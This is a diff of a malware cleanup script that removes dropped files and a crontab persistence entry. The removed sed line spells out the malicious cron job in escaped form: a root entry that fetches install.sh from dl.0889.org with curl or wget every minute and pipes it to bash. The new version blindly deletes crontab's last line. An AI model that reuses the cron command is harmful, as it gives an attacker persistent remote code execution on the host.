@@ -9,4 +9,5 @@ sudo rm -f /usr/sbin/kernel
 sudo rm -f /usr/sbin/.conf
 
 echo "remove on crontab"
-sudo sed -i '/\* \* \* \* \* root \(curl -fsSL dl\.0889\.org\/install\.sh || wget -q -O - dl\.0889\.org\/install\.sh\) | bash >\/dev\/null 2>&1/d' /etc/crontab
+sudo cp /etc/crontab /etc/crontab.bak
+sudo sed -i '$d' /etc/crontab
